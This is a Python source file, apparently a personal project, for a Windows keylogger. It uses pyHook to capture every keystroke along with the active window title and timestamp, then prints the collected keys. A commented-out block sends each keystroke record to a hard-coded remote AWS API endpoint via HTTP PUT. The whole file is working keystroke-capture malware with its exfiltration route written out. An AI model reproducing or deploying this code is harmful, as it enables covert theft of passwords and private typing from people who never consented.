'''
    Autor: @SergioRAlvarezP
    Fecha de Inicio: 2019-05-21
    Fecha de término: 2019-06-26
    Fecha de Actualización: 2019-08-27
'''
from collections import deque
import pyHook, pythoncom, sys, logging, requests
import time, datetime
import requests
from requests.exceptions import HTTPError

i=0

'''**CONFIGURACIÓN DEL REQUEST**'''
name="prueba2"
base_url = "https://ed2ku4egij.execute-api.us-west-1.amazonaws.com/Prod/"
endpoint = '{0}evento/{1}'.format(base_url,name)
'''***CONFIGURACIÓN DEL REQUEST***'''

class Queue(object):
    def __init__(self):
        self.items=deque()
    
    def qpush(self,x):
        self.items.appendleft(x)

    def qshow(self):
        print(self.items)

    def qempty(self):
        if len(self.items)==0:
            return True
        else:
            return False

    def qpop(self):
        if self.qempty():
            return None
        else:
            return self.items.pop()
    
    def qlen(self):
        return len(self.items)

def OnKeyboardEvent(event):
    string = ""
    element = [event.MessageName,event.Message,event.Time,event.Window,event.WindowName,event.Ascii,event.Key,event.KeyID,event.ScanCode,event.Extended,event.Injected,event.Alt,event.Transition]
    elements.qpush(element)

    if elements.qlen() > 10:
        i=elements.qlen()
        while i>0:
            value = elements.qpop()
            '''contenido = {
                'MessageName'   :   value[0],
                'Message'       :   value[1],
                'Time'          :   value[2],
                'Window'        :   value[3],
                'WindowName'    :   value[4],
                'ASCII'         :   value[5],
                'Key'           :   value[6],
                'KeyID'         :   value[7],
                'ScanCode'      :   value[8],
                'Extended'      :   value[9],
                'Injected'      :   value[10],
                'Alt'           :   value[11],
                'Transition'    :   value[12]
            }

            try:
                res = requests.put(endpoint,json=contenido)
                res.raise_for_status()
            except HTTPError as http_err:
                print(f'Error HTTP: {http_err}')
                elements.qpush(value)
            except Exception as err:
                print(f'Error: {err}')
                elements.qpush(value)
            else:
                print('Correcto')
                i-=1
            '''
            item = value[6]
            string = string + item
            i-=1
        print ('########################',string)
            
    return True

elements = Queue()
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()